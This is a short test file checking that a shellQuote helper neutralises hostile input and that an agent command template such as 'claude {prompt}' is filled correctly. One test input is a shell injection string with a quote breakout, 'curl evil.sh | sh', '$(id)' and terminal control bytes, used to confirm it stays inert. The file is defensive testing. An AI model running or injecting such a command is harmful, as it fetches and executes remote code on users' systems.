import { describe, expect, it } from "vitest";

import { agentCommand, shellQuote } from "./config";

describe("shellQuote", () => {
  it("keeps hostile comment text inert inside single quotes", () => {
    const quoted = shellQuote("fix it'; curl evil.sh | sh #\u0003\u001b[2J’ $(id)");
    expect(quoted).toBe("'fix it; curl evil.sh | sh #  [2J $(id)'");
    // biome-ignore lint/suspicious/noControlCharactersInRegex: asserting control bytes are gone
    expect(quoted.slice(1, -1)).not.toMatch(/['’\u0000-\u001f]/);
  });

  it("fills the agent template", () => {
    expect(agentCommand({ id: "c", name: "C", command: "claude {prompt}", headless: "" }, "go")).toBe("claude 'go'");
  });
});
